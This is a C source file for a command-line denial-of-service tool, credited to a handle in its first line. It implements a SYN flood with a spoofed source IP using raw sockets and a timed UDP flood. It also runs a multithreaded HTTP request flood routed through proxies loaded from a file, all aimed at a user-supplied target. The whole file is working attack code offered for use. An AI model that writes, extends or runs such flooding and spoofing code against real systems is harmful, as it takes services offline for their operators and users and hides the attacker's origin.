// By Scav-engeR : @Ghiddra
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

#define BUFFER_SIZE 8192
#define MAX_PROXIES 1000
#define PCKT_LEN 8192

typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
} Proxy;

char target_url[BUFFER_SIZE];
int target_port;
char request_type[16];

// Global flag to control loops
int keep_running = 1;

// Function to load proxies from file
int load_proxies(Proxy proxies[], int max_proxies, const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Error opening proxy file");
        return -1;
    }

    int count = 0;
    while (fscanf(file, "%15[^:]:%d\n", proxies[count].ip, &proxies[count].port) == 2) {
        count++;
        if (count >= max_proxies) break;
    }

    fclose(file);
    return count;
}

// Function for SYN Flood
void syn_flood(const char *target_ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    char packet[PCKT_LEN];
    memset(packet, 0, PCKT_LEN);

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(rand());
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr("192.168.1.100"); // Spoofed source IP
    iph->daddr = sin.sin_addr.s_addr;

    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(512);

    time_t start_time = time(NULL);
    int packet_count = 0;

    while ((time(NULL) - start_time) < duration && keep_running) {
        tcph->seq = htonl(rand());
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            packet_count++;
            printf("\r[INFO] SYN Packet Sent: %d", packet_count);
            fflush(stdout);
        }
    }

    printf("\n[INFO] SYN flood attack completed. Total packets sent: %d\n", packet_count);
    close(sock);
}

// Function for UDP Flood
void udp_flood(const char *target_ip, int port, int duration, int packet_size) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    char packet[BUFFER_SIZE];
    memset(packet, 0, sizeof(packet));

    time_t start_time = time(NULL);
    int packet_count = 0;

    while ((time(NULL) - start_time) < duration && keep_running) {
        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            packet_count++;
            printf("\r[INFO] UDP Packet Sent: %d", packet_count);
            fflush(stdout);
        }
    }

    printf("\n[INFO] UDP flood attack completed. Total packets sent: %d\n", packet_count);
    close(sock);
}

// Function to send HTTP/HTTPS requests through a proxy
void *proxy_http_request(void *arg) {
    Proxy *proxy = (Proxy *)arg;

    printf("Using proxy %s:%d for %s request to %s on port %d...\n",
           proxy->ip, proxy->port, request_type, target_url, target_port);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in proxy_addr = {0};
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy->port);
    if (inet_pton(AF_INET, proxy->ip, &proxy_addr.sin_addr) <= 0) {
        perror("Invalid proxy address");
        close(sockfd);
        pthread_exit(NULL);
    }

    if (connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        perror("Proxy connection failed");
        close(sockfd);
        pthread_exit(NULL);
    }

    char request[BUFFER_SIZE];
    int request_len = snprintf(request, sizeof(request),
                               "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
                               request_type, target_url, target_url);

    if (request_len >= sizeof(request)) {
        fprintf(stderr, "Error: Request truncated due to buffer size. Increase BUFFER_SIZE.\n");
        close(sockfd);
        pthread_exit(NULL);
    }

    if (send(sockfd, request, request_len, 0) < 0) {
        perror("Failed to send HTTP request");
        close(sockfd);
        pthread_exit(NULL);
    }

    char response[BUFFER_SIZE];
    int bytes_received;
    while ((bytes_received = recv(sockfd, response, sizeof(response) - 1, 0)) > 0) {
        response[bytes_received] = '\0';
        printf("%s", response);
    }

    if (bytes_received < 0) {
        perror("Error receiving response");
    }

    close(sockfd);
    pthread_exit(NULL);
}

// Main function
int main() {
    char method[16];
    int duration, packet_size;

    while (1) {
        printf("\nAvailable Methods: syn, udp, http\n");
        printf("Enter the method: ");
        scanf("%s", method);

        if (strcmp(method, "syn") == 0) {
            char target_ip[BUFFER_SIZE];
            int port;
            printf("Enter target IP: ");
            scanf("%s", target_ip);
            printf("Enter target port: ");
            scanf("%d", &port);
            printf("Enter duration (seconds): ");
            scanf("%d", &duration);
            syn_flood(target_ip, port, duration);
        } else if (strcmp(method, "udp") == 0) {
            char target_ip[BUFFER_SIZE];
            int port;
            printf("Enter target IP: ");
            scanf("%s", target_ip);
            printf("Enter target port: ");
            scanf("%d", &port);
            printf("Enter duration (seconds): ");
            scanf("%d", &duration);
            printf("Enter packet size (bytes): ");
            scanf("%d", &packet_size);
            udp_flood(target_ip, port, duration, packet_size);
        } else if (strcmp(method, "http") == 0) {
            Proxy proxies[MAX_PROXIES];
            int proxy_count = load_proxies(proxies, MAX_PROXIES, "proxy.txt");

            if (proxy_count <= 0) {
                fprintf(stderr, "No proxies loaded.\n");
                continue;
            }

            printf("Enter the URL: ");
            scanf("%s", target_url);
            printf("Enter target port (e.g., 80 or 443): ");
            scanf("%d", &target_port);
            printf("Enter request type (GET or POST): ");
            scanf("%s", request_type);

            pthread_t threads[MAX_PROXIES];
            for (int i = 0; i < proxy_count; i++) {
                pthread_create(&threads[i], NULL, proxy_http_request, &proxies[i]);
            }

            for (int i = 0; i < proxy_count; i++) {
                pthread_join(threads[i], NULL);
            }
        } else {
            printf("Invalid method. Try again.\n");
        }

        printf("Do you want to reset or exit? (reset/exit): ");
        char choice[16];
        scanf("%s", choice);
        if (strcmp(choice, "exit") == 0) {
            break;
        }
    }

    printf("Program terminated.\n");
    return 0;
}
